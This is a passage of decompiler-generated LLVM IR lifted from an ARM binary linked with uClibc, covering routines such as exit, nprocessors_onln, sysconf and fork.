  br i1 %v9_13290, label %.thread39, label %bb67

.thread39:                                        ; preds = %dec_label_pc_13290
  %v1_1329c40 = add i32 %v0_1329c, 1
  store i32 %v1_1329c40, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_132a4

bb67:                                             ; preds = %dec_label_pc_13290
  %v3_13290 = icmp ult i32 %v0_13290, %v1_13290
  %v1_1329c = add i32 %v0_1329c, 1
  store i32 %v1_1329c, i32* %r4.global-to-local, align 4
  br i1 %v3_13290, label %dec_label_pc_132a4, label %dec_label_pc_132bc

dec_label_pc_132a4:                               ; preds = %bb67, %.thread39
  %v1_1329c44 = phi i32 [ %v1_1329c40, %.thread39 ], [ %v1_1329c, %bb67 ]
  %v4_132ac2443 = phi i32 [ 1, %.thread39 ], [ 0, %bb67 ]
  %v1_132a4 = load i32, i32* %sl.global-to-local, align 4
  %v3_132a4 = icmp uge i32 %v3_132b4, %v1_132a4
  %v9_132a4 = icmp eq i32 %v3_132b4, %v1_132a4
  %v2_132a8 = xor i1 %v3_132a4, true
  %v3_132a8 = or i1 %v9_132a4, %v2_132a8
  br i1 %v3_132a8, label %bb68, label %bb69

bb68:                                             ; preds = %dec_label_pc_132a4
  br label %bb69

bb69:                                             ; preds = %dec_label_pc_132a4, %bb68
  %v4_132ac = phi i32 [ %v4_132ac2443, %dec_label_pc_132a4 ], [ 0, %bb68 ]
  %v2_132ac = xor i1 %v9_132a4, true
  %v3_132ac = and i1 %v3_132a4, %v2_132ac
  br i1 %v3_132ac, label %bb70, label %thread-pre-split

bb70:                                             ; preds = %bb69
  %v5_132ac = urem i32 %v4_132ac, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb69, %bb70
  %v0_132b0 = phi i32 [ %v5_132ac, %bb70 ], [ %v4_132ac, %bb69 ]
  %v2_132b0 = icmp eq i32 %v0_132b0, 0
  br i1 %v2_132b0, label %bb71, label %dec_label_pc_132bc

bb71:                                             ; preds = %thread-pre-split
  %v4_132b4 = mul i32 %v0_13290, %v1_13288
  %v5_132b4 = add i32 %v4_132b4, %v3_132b4
  store i32 %v5_132b4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1325c

dec_label_pc_132bc:                               ; preds = %bb67, %thread-pre-split
  %v0_132c4 = call i32 @__aeabi_read_tp()
  %v0_132c8 = load i32, i32* %r7.global-to-local, align 4
  %v2_132c8 = and i32 %v0_1318c, %v0_132c8
  store i32 %v2_132c8, i32* %r7.global-to-local, align 4
  %v0_132cc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_132cc, i32* %ip.global-to-local, align 4
  %v3_132d0 = load i16, i16* @global_var_21a48.352, align 2
  %v4_132d0 = sext i16 %v3_132d0 to i32
  %v3_132d8 = add i32 %v4_132d0, %v0_132c4
  %v4_132d8 = inttoptr i32 %v3_132d8 to i32*
  store i32 34, i32* %v4_132d8, align 4
  %v0_1325c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1325c

dec_label_pc_132e0.loopexit:                      ; preds = %bb66
  %v0_132e0.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_132e0

dec_label_pc_132e0:                               ; preds = %.thread, %dec_label_pc_132e0.loopexit
  %v1_132e4 = phi i32 [ %v1_132e427, %dec_label_pc_132e0.loopexit ], [ %v1_132e429, %.thread ]
  %v2_132e4 = phi i32 [ %v0_132e0.pre, %dec_label_pc_132e0.loopexit ], [ %v0_13180, %.thread ]
  %v2_132e0 = icmp eq i32 %v2_132e4, 0
  br i1 %v2_132e0, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_132e0
  %v3_132e4 = inttoptr i32 %v2_132e4 to i32*
  store i32 %v1_132e4, i32* %v3_132e4, align 4
  br label %bb73

bb73:                                             ; preds = %dec_label_pc_132e0, %bb72
  %v0_132ec = load i32, i32* %r7.global-to-local, align 4
  %v2_132ec = icmp eq i32 %v0_132ec, 0
  %. = select i1 %v2_132ec, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r1.global-to-local, align 4
  %v2_132f8 = icmp eq i32 %v0_1318c, 0
  %v0_13324.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br i1 %v2_132f8, label %dec_label_pc_1331c, label %bb76

bb76:                                             ; preds = %bb73
  %tmp81 = icmp ugt i32 %v0_13324.pre.pre, %.
  br i1 %tmp81, label %dec_label_pc_13304, label %dec_label_pc_1331c

dec_label_pc_13304:                               ; preds = %bb76
  %v0_13308 = call i32 @__aeabi_read_tp()
  %v3_1330c = load i16, i16* @global_var_21a48.352, align 2
  %v4_1330c = sext i16 %v3_1330c to i32
  %v3_13314 = add i32 %v4_1330c, %v0_13308
  %v4_13314 = inttoptr i32 %v3_13314 to i32*
  store i32 34, i32* %v4_13314, align 4
  %v0_13318 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_13318, i32* %ip.global-to-local, align 4
  %v0_1331c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1331c

dec_label_pc_1331c:                               ; preds = %bb76, %bb73, %dec_label_pc_13304
  %v0_13324.pre = phi i32 [ %v0_13324.pre.pre, %bb76 ], [ %v0_13318, %dec_label_pc_13304 ], [ %v0_13324.pre.pre, %bb73 ]
  %v0_1331c = phi i32 [ %v0_132ec, %bb76 ], [ %v0_1331c.pre, %dec_label_pc_13304 ], [ %v0_132ec, %bb73 ]
  %v2_1331c = icmp eq i32 %v0_1331c, 0
  br i1 %v2_1331c, label %dec_label_pc_1331c._crit_edge, label %bb77

bb77:                                             ; preds = %dec_label_pc_1331c
  %v2_13320 = sub i32 0, %v0_13324.pre
  store i32 %v2_13320, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1331c._crit_edge

dec_label_pc_1331c._crit_edge:                    ; preds = %dec_label_pc_1331c, %bb77
  %v0_13324 = phi i32 [ %v2_13320, %bb77 ], [ %v0_13324.pre, %dec_label_pc_1331c ]
  ret i32 %v0_13324

; uselistorder directives
  uselistorder i32 %v0_13324.pre, { 1, 0 }
  uselistorder i32 %v0_13324.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_132ac, { 1, 0 }
  uselistorder i1 %v3_132a4, { 1, 0 }
  uselistorder i32 %v1_132a4, { 1, 0 }
  uselistorder i32 %v5_13284, { 1, 0 }
  uselistorder i32 %v1_13270, { 1, 0 }
  uselistorder i32 %v1_13268, { 2, 0, 1 }
  uselistorder i32 %v0_1329c, { 1, 0, 2 }
  uselistorder i32 %v0_1325c, { 1, 0 }
  uselistorder i32 %v3_1320c, { 1, 0 }
  uselistorder i32 %v1_13200, { 1, 0, 2 }
  uselistorder i32 %v0_131f4, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_131d0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1318c, { 1, 0 }
  uselistorder i32 %v0_13188, { 1, 0, 2, 3 }
  uselistorder i32 %v0_13184, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 4, 2, 1, 3, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 6, 0, 7, 1, 2, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 7, 8 }
  uselistorder i32 34, { 1, 2, 0, 4, 5, 3, 6 }
  uselistorder i8 48, { 1, 0, 2 }
  uselistorder i32 -17, { 1, 0 }
  uselistorder i8 45, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1331c._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1331c, { 2, 0, 1 }
  uselistorder label %bb73, { 1, 0 }
  uselistorder label %dec_label_pc_132e0, { 1, 0 }
  uselistorder label %dec_label_pc_132bc, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb69, { 1, 0 }
  uselistorder label %bb66, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13260, { 1, 0 }
  uselistorder label %dec_label_pc_1325c, { 1, 0 }
  uselistorder label %bb64, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_131d4, { 1, 0 }
  uselistorder label %dec_label_pc_131d0, { 1, 0 }
  uselistorder label %dec_label_pc_13198, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* @r5, align 4
  %v4_13350 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 140) to i32*), align 4
  store i32 %v4_13350, i32* @r4, align 4
  %v2_13358 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_13370 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_13370)
  %v0_13384 = load i32, i32* @r5, align 4
  %v2_13384 = add i32 %v0_13384, 16
  %v3_13384 = inttoptr i32 %v2_13384 to i32*
  %v4_13384 = load i32, i32* %v3_13384, align 4
  call void @__pseudo_branch(i32 %v4_13384)
  %v0_13394 = load i32, i32* @r5, align 4
  %v2_13394 = add i32 %v0_13394, 636
  %v3_13394 = inttoptr i32 %v2_13394 to i32*
  %v4_13394 = load i32, i32* %v3_13394, align 4
  %v2_1339c = icmp eq i32 %v4_13394, 0
  br i1 %v2_1339c, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v2_133a8 = xor i1 %v2_1339c, true
  call void @__pseudo_cond_branch(i1 %v2_133a8, i32 %v4_13394)
  store i32 %v2_13358, i32* @r0, align 4
  %v0_133b8 = load i32, i32* @r5, align 4
  %v2_133b8 = add i32 %v0_133b8, 44
  %v3_133b8 = inttoptr i32 %v2_133b8 to i32*
  %v4_133b8 = load i32, i32* %v3_133b8, align 4
  call void @__pseudo_branch(i32 %v4_133b8)
  %v0_133c4 = call i32 @__GI___uClibc_fini()
  %v0_133cc = load i32, i32* @r5, align 4
  %v2_133cc = add i32 %v0_133cc, -47788
  %v2_133d4 = icmp eq i32 %v2_133cc, 0
  br i1 %v2_133d4, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_133dc = xor i1 %v2_133d4, true
  call void @__pseudo_cond_branch(i1 %v2_133dc, i32 %v2_133cc)
  %v0_133e0 = load i32, i32* @r6, align 4
  %v1_133e4 = call i32 @__GI__exit(i32 %v0_133e0)
  %v0_133e8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_133e8, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  br label %.thread6

.thread6:                                         ; preds = %bb9, %bb10
  %v4_13400 = phi i32 [ %v1_133e4, %bb9 ], [ 0, %bb10 ]
  ret i32 %v4_13400

; uselistorder directives
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @nprocessors_onln() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 -34012), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_13428 = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 -34012))
  store i32 %v1_13428, i32* @r6, align 4
  %v2_1342c = icmp eq i32 %v1_13428, 0
  br i1 %v2_1342c, label %dec_label_pc_134ac, label %dec_label_pc_13434

dec_label_pc_13434:                               ; preds = %entry
  store i32 276, i32* @sl, align 4
  %v0_1343c = load i32, i32* @r4, align 4
  %v2_1343c = add i32 %v0_1343c, -34000
  store i32 %v2_1343c, i32* @r8, align 4
  %v2_13440 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_13440, i32* @r7, align 4
  br label %bb18

dec_label_pc_13448:                               ; preds = %bb18
  %v3_13448 = load i32, i32* %stack_var_-36, align 4
  %v1_1344c = inttoptr i32 %v3_13448 to i32*
  %v2_1344c = load i32, i32* %v1_1344c, align 4
  %v1_13450 = inttoptr i32 %v2_1344c to i8*
  %v2_13450 = load i8, i8* %v1_13450, align 1
  %v7_13454 = icmp eq i8 %v2_13450, 99
  br i1 %v7_13454, label %dec_label_pc_1345c, label %.backedge3

dec_label_pc_1345c:                               ; preds = %dec_label_pc_13448
  %v1_1345c = add i32 %v2_1344c, 1
  %v2_1345c = inttoptr i32 %v1_1345c to i8*
  %v3_1345c = load i8, i8* %v2_1345c, align 1
  %v7_13460 = icmp eq i8 %v3_1345c, 112
  br i1 %v7_13460, label %dec_label_pc_13468, label %.backedge3

dec_label_pc_13468:                               ; preds = %dec_label_pc_1345c
  %v1_13468 = add i32 %v2_1344c, 2
  %v2_13468 = inttoptr i32 %v1_13468 to i8*
  %v3_13468 = load i8, i8* %v2_13468, align 1
  %v7_1346c = icmp eq i8 %v3_13468, 117
  br i1 %v7_1346c, label %dec_label_pc_13474, label %.backedge3

dec_label_pc_13474:                               ; preds = %dec_label_pc_13468
  %v1_13474 = add i32 %v2_1344c, 3
  %v2_13474 = inttoptr i32 %v1_13474 to i8*
  %v3_13474 = load i8, i8* %v2_13474, align 1
  %v4_13474 = zext i8 %v3_13474 to i32
  %v0_13478 = load i32, i32* @r4, align 4
  %v1_13478 = load i32, i32* @sl, align 4
  %v2_13478 = add i32 %v1_13478, %v0_13478
  %v3_13478 = inttoptr i32 %v2_13478 to i32*
  %v4_13478 = load i32, i32* %v3_13478, align 4
  %v2_1347c = mul nuw nsw i32 %v4_13474, 2
  %v2_13480 = add i32 %v4_13478, %v2_1347c
  %v3_13480 = inttoptr i32 %v2_13480 to i16*
  %v4_13480 = load i16, i16* %v3_13480, align 2
  %v1_13484 = and i16 %v4_13480, 8
  %v2_13484 = icmp eq i16 %v1_13484, 0
  br i1 %v2_13484, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_13474
  %v1_13488 = load i32, i32* @r5, align 4
  %v2_13488 = add i32 %v1_13488, 1
  store i32 %v2_13488, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_13474, %dec_label_pc_13448, %dec_label_pc_1345c, %dec_label_pc_13468
  %v0_1348c.pre = load i32, i32* @r6, align 4
  %v0_13498.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_13434
  %v0_13498 = phi i32 [ %v0_13498.pre, %.backedge3 ], [ %v2_1343c, %dec_label_pc_13434 ]
  %v0_1348c = phi i32 [ %v0_1348c.pre, %.backedge3 ], [ %v1_13428, %dec_label_pc_13434 ]
  %v4_1349c = inttoptr i32 %v0_1348c to i32*
  %v5_1349c = call i32 @__GI_config_read(i32* %v4_1349c, i32 %v2_13440, i32 258, i32 %v0_13498)
  %v2_134a0 = icmp eq i32 %v5_1349c, 0
  br i1 %v2_134a0, label %dec_label_pc_13510, label %dec_label_pc_13448

dec_label_pc_134ac:                               ; preds = %entry
  %v0_134b0 = load i32, i32* @r4, align 4
  %v2_134b0 = add i32 %v0_134b0, -33996
  store i32 %v2_134b0, i32* @r0, align 4
  %v1_134b4 = call i32 @__GI_config_open(i32 %v2_134b0)
  store i32 %v1_134b4, i32* @r6, align 4
  %v2_134b8 = icmp eq i32 %v1_134b4, 0
  br i1 %v2_134b8, label %bb19, label %dec_label_pc_134c4

bb19:                                             ; preds = %dec_label_pc_134ac
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_13510

dec_label_pc_134c4:                               ; preds = %dec_label_pc_134ac
  %v0_134c8 = load i32, i32* @r4, align 4
  %v2_134c8 = add i32 %v0_134c8, -33980
  store i32 %v2_134c8, i32* @r8, align 4
  %v2_134d0 = add i32 %v0_134c8, -33944
  store i32 %v2_134d0, i32* @r7, align 4
  %v2_134d4 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_134d4, i32* @r4, align 4
  br label %bb21

dec_label_pc_134dc:                               ; preds = %bb21
  %v0_13508 = load i32, i32* @r8, align 4
  %v3_134dc = load i32, i32* %stack_var_-36, align 4
  %v1_134e0 = inttoptr i32 %v3_134dc to i32*
  %v2_134e0 = load i32, i32* %v1_134e0, align 4
  store i32 %v2_134e0, i32* @r1, align 4
  %v2_134e4 = inttoptr i32 %v0_13508 to i8*
  %v3_134e4 = call i32 @__GI_strcoll(i8* %v2_134e4, i32 %v2_134e0)
  %v2_134e8 = icmp eq i32 %v3_134e4, 0
  br i1 %v2_134e8, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_134dc
  %v1_134ec = load i32, i32* @r5, align 4
  %v2_134ec = add i32 %v1_134ec, 1
  store i32 %v2_134ec, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_134dc
  %v0_134f8.pre = load i32, i32* @r7, align 4
  %v0_134fc.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_134c4
  %v0_134fc = phi i32 [ %v0_134fc.pre, %.backedge ], [ %v1_134b4, %dec_label_pc_134c4 ]
  %v0_134f8 = phi i32 [ %v0_134f8.pre, %.backedge ], [ %v2_134d0, %dec_label_pc_134c4 ]
  %v4_13500 = inttoptr i32 %v0_134fc to i32*
  %v5_13500 = call i32 @__GI_config_read(i32* %v4_13500, i32 %v2_134d4, i32 459266, i32 %v0_134f8)
  %v2_13504 = icmp eq i32 %v5_13500, 0
  br i1 %v2_13504, label %dec_label_pc_13510, label %dec_label_pc_134dc

dec_label_pc_13510:                               ; preds = %bb18, %bb21, %bb19
  %v0_13510 = load i32, i32* @r6, align 4
  %v1_13514 = inttoptr i32 %v0_13510 to i32*
  %v2_13514 = call i32 @__GI_config_close(i32* %v1_13514)
  %v0_13518 = load i32, i32* @r5, align 4
  %v2_13518 = icmp eq i32 %v0_13518, 0
  %.v0_13518 = select i1 %v2_13518, i32 1, i32 %v0_13518
  ret i32 %.v0_13518

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder i32 (i32)* @__GI_config_open, { 1, 0 }
  uselistorder label %dec_label_pc_13510, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @sysconf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_13944

bb:                                               ; preds = %entry
  %v7_13568 = mul i32 %arg1, 4
  %v8_13568 = add i32 %v7_13568, ptrtoint (i32* @global_var_13570.499 to i32)
  call void @__pseudo_branch(i32 %v8_13568)
  br label %dec_label_pc_13944

dec_label_pc_13944:                               ; preds = %bb, %entry
  %v0_13948 = call i32 @__aeabi_read_tp()
  %v3_1394c = load i16, i16* @global_var_21a48.352, align 2
  %v4_1394c = sext i16 %v3_1394c to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_13958 = add i32 %v4_1394c, %v0_13948
  %v4_13958 = inttoptr i32 %v3_13958 to i32*
  store i32 22, i32* %v4_13958, align 4
  %v0_13b3c = load i32, i32* %r1.global-to-local, align 4
  ret i32 %v0_13b3c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  store i32 12796, i32* %r5.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %r8.global-to-local, align 4
  %v4_13c6816 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 12796) to i32*), align 4
  store i32 %v4_13c6816, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13c6c18 = icmp eq i32 %v4_13c6816, 0
  br i1 %v2_13c6c18, label %dec_label_pc_13c74, label %dec_label_pc_13b98

dec_label_pc_13b98:                               ; preds = %entry, %dec_label_pc_13c68.backedge
  call void @__pseudo_branch(i32 -61536)
  %v0_13ba4 = load i32, i32* %r7.global-to-local, align 4
  %v1_13ba4 = add i32 %v0_13ba4, 20
  %v2_13ba4 = inttoptr i32 %v1_13ba4 to i32*
  %v3_13ba4 = load i32, i32* %v2_13ba4, align 4
  store i32 %v3_13ba4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13ba8 = icmp eq i32 %v3_13ba4, 0
  store i32 %v3_13ba4, i32* %r4.global-to-local, align 4
  br i1 %v2_13ba8, label %dec_label_pc_13c68.backedge, label %dec_label_pc_13bb8

dec_label_pc_13c68.backedge:                      ; preds = %dec_label_pc_13b98, %dec_label_pc_13be4
  %v0_13c68 = load i32, i32* %r8.global-to-local, align 4
  %v1_13c68 = load i32, i32* %r5.global-to-local, align 4
  %v2_13c68 = add i32 %v1_13c68, %v0_13c68
  %v3_13c68 = inttoptr i32 %v2_13c68 to i32*
  %v4_13c68 = load i32, i32* %v3_13c68, align 4
  store i32 %v4_13c68, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13c6c = icmp eq i32 %v4_13c68, 0
  br i1 %v2_13c6c, label %dec_label_pc_13c74, label %dec_label_pc_13b98

dec_label_pc_13bb8:                               ; preds = %dec_label_pc_13b98
  %v0_13bb8 = load i32, i32* %r8.global-to-local, align 4
  %v1_13bb8 = load i32, i32* %r5.global-to-local, align 4
  %v2_13bb8 = add i32 %v1_13bb8, %v0_13bb8
  %v3_13bb8 = inttoptr i32 %v2_13bb8 to i32*
  %v4_13bb8 = load i32, i32* %v3_13bb8, align 4
  %v1_13bbc = add i32 %v4_13bb8, 20
  store i32 %v1_13bbc, i32* %r2.global-to-local, align 4
  %v1_13bc0132 = inttoptr i32 %v1_13bbc to i32*
  %v2_13bc0133 = load i32, i32* %v1_13bc0132, align 4
  store i32 %v2_13bc0133, i32* %r3.global-to-local, align 4
  %v3_13bc4135 = icmp uge i32 %v2_13bc0133, %v3_13ba4
  store i1 %v3_13bc4135, i1* %cpsr_c.global-to-local, align 1
  %v9_13bc4141 = icmp eq i32 %v2_13bc0133, %v3_13ba4
  br i1 %v9_13bc4141, label %dec_label_pc_13bcc, label %dec_label_pc_13be4

dec_label_pc_13bcc:                               ; preds = %dec_label_pc_13bb8, %dec_label_pc_13bcc.dec_label_pc_13bc0_crit_edge
  %v0_13bcc142 = phi i32 [ %v1_13bc4.pre, %dec_label_pc_13bcc.dec_label_pc_13bc0_crit_edge ], [ %v3_13ba4, %dec_label_pc_13bb8 ]
  store i32 %v0_13bcc142, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_13bdc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13bdc, label %dec_label_pc_13be0, label %dec_label_pc_13bcc.dec_label_pc_13bc0_crit_edge

dec_label_pc_13bcc.dec_label_pc_13bc0_crit_edge:  ; preds = %dec_label_pc_13bcc
  %v0_13bc0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13bc4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_13bc0 = inttoptr i32 %v0_13bc0.pre to i32*
  %v2_13bc0 = load i32, i32* %v1_13bc0, align 4
  store i32 %v2_13bc0, i32* %r3.global-to-local, align 4
  %v3_13bc4 = icmp uge i32 %v2_13bc0, %v1_13bc4.pre
  store i1 %v3_13bc4, i1* %cpsr_c.global-to-local, align 1
  %v9_13bc4 = icmp eq i32 %v2_13bc0, %v1_13bc4.pre
  br i1 %v9_13bc4, label %dec_label_pc_13bcc, label %dec_label_pc_13be4

dec_label_pc_13be0:                               ; preds = %dec_label_pc_13bcc
  %v0_13be0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13be0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13be4

dec_label_pc_13be4:                               ; preds = %dec_label_pc_13bb8, %dec_label_pc_13bcc.dec_label_pc_13bc0_crit_edge, %dec_label_pc_13be0
  %v0_13be4 = phi i32 [ %v0_13be0, %dec_label_pc_13be0 ], [ %v2_13bc0133, %dec_label_pc_13bb8 ], [ %v2_13bc0, %dec_label_pc_13bcc.dec_label_pc_13bc0_crit_edge ]
  %v1_13be4 = phi i32 [ %v0_13be0, %dec_label_pc_13be0 ], [ %v3_13ba4, %dec_label_pc_13bb8 ], [ %v1_13bc4.pre, %dec_label_pc_13bcc.dec_label_pc_13bc0_crit_edge ]
  %v3_13be4 = icmp uge i32 %v0_13be4, %v1_13be4
  store i1 %v3_13be4, i1* %cpsr_c.global-to-local, align 1
  %v9_13be4 = icmp eq i32 %v0_13be4, %v1_13be4
  br i1 %v9_13be4, label %dec_label_pc_13bec, label %dec_label_pc_13c68.backedge

dec_label_pc_13bec:                               ; preds = %dec_label_pc_13be4
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_13c00 = ptrtoint i32* %stack_var_-88 to i32
  br label %dec_label_pc_13bf0

dec_label_pc_13bf0:                               ; preds = %dec_label_pc_13c58, %dec_label_pc_13bec
  %v0_13bf0 = load i32, i32* %r7.global-to-local, align 4
  %v1_13bf0 = add i32 %v0_13bf0, 4
  %v2_13bf0 = inttoptr i32 %v1_13bf0 to i32*
  %v3_13bf0 = load i32, i32* %v2_13bf0, align 4
  store i32 %v3_13bf0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13bf4 = icmp eq i32 %v3_13bf0, 0
  br i1 %v2_13bf4, label %bb72, label %bb

bb:                                               ; preds = %dec_label_pc_13bf0
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_13bf0, %bb
  %v2_13bfc = xor i1 %v2_13bf4, true
  call void @__pseudo_cond_branch(i1 %v2_13bfc, i32 %v3_13bf0)
  %v0_13c04 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_13c04, i32* %stack_var_-88, align 4
  %v1_13c08 = inttoptr i32 %v0_13c04 to i32*
  %v2_13c08 = load i32, i32* %v1_13c08, align 4
  store i32 %v2_13c08, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13c0c = icmp eq i32 %v2_13c08, 0
  store i32 %v2_13c00, i32* %r5.global-to-local, align 4
  br i1 %v2_13c0c, label %dec_label_pc_13c78.loopexit, label %dec_label_pc_13c20

dec_label_pc_13c20:                               ; preds = %bb72
  %v1_13c20 = add i32 %v2_13c08, 20
  store i32 %v1_13c20, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13c24

dec_label_pc_13c24:                               ; preds = %dec_label_pc_13c58.dec_label_pc_13c24_crit_edge, %dec_label_pc_13c20
  %v0_13c28 = phi i32 [ %v0_13c28.pre, %dec_label_pc_13c58.dec_label_pc_13c24_crit_edge ], [ %v1_13c20, %dec_label_pc_13c20 ]
  %v0_13c24 = phi i32 [ %v0_13c24.pre, %dec_label_pc_13c58.dec_label_pc_13c24_crit_edge ], [ %v2_13c08, %dec_label_pc_13c20 ]
  %v1_13c24 = add i32 %v0_13c24, 20
  %v2_13c24 = inttoptr i32 %v1_13c24 to i32*
  %v3_13c24 = load i32, i32* %v2_13c24, align 4
  store i32 %v0_13c28, i32* %r2.global-to-local, align 4
  store i32 %v3_13c24, i32* %r4.global-to-local, align 4
  %v1_13c34119 = inttoptr i32 %v0_13c28 to i32*
  %v2_13c34120 = load i32, i32* %v1_13c34119, align 4
  store i32 %v2_13c34120, i32* %r3.global-to-local, align 4
  %v3_13c38122 = icmp uge i32 %v2_13c34120, %v3_13c24
  store i1 %v3_13c38122, i1* %cpsr_c.global-to-local, align 1
  %v9_13c38128 = icmp eq i32 %v2_13c34120, %v3_13c24
  br i1 %v9_13c38128, label %dec_label_pc_13c40, label %dec_label_pc_13c58

dec_label_pc_13c40:                               ; preds = %dec_label_pc_13c24, %dec_label_pc_13c40.dec_label_pc_13c34_crit_edge
  %v0_13c40129 = phi i32 [ %v1_13c38.pre, %dec_label_pc_13c40.dec_label_pc_13c34_crit_edge ], [ %v3_13c24, %dec_label_pc_13c24 ]
  store i32 %v0_13c40129, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_13c50 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13c50, label %dec_label_pc_13c54, label %dec_label_pc_13c40.dec_label_pc_13c34_crit_edge

dec_label_pc_13c40.dec_label_pc_13c34_crit_edge:  ; preds = %dec_label_pc_13c40
  %v0_13c34.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13c38.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_13c34 = inttoptr i32 %v0_13c34.pre to i32*
  %v2_13c34 = load i32, i32* %v1_13c34, align 4
  store i32 %v2_13c34, i32* %r3.global-to-local, align 4
